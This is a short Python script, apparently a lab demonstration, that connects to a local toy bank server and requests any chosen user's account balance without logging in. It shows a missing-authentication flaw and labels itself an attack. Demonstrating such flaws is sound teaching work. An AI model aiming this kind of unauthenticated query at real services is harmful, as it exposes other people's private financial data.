import socket
import json
HOST = "127.0.0.1"
PORT = 5001

def send_json(conn, data):
    message = json.dumps(data) + "\n"
    conn.sendall(message.encode("utf-8"))

def receive_json(file):
    line = file.readline()

    return json.loads(line)

def main():
    try:
        attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker.connect((HOST,PORT))

        print("Connecsted to the Bank server")
        print ("NO loging performed")
        print("NO password supplied")

        target_username = input("Target_username: ")

        file = attacker.makefile("r", encoding="utf-8")

        send_json(attacker,{
            "action": "check_balance",
            "username": target_username
        })

        response = receive_json(file)
        if response["status"] == "ok":
            print("ACCOUNT HOLDER: ", response["username"])
            print("Balance: ", response["balance"], "BDT")
        else:
            print("Attack failed: ", response["message"])

    except ConnectionRefusedError:
        print("Connection refused Start the server agian")

if __name__ == "__main__":
    main()
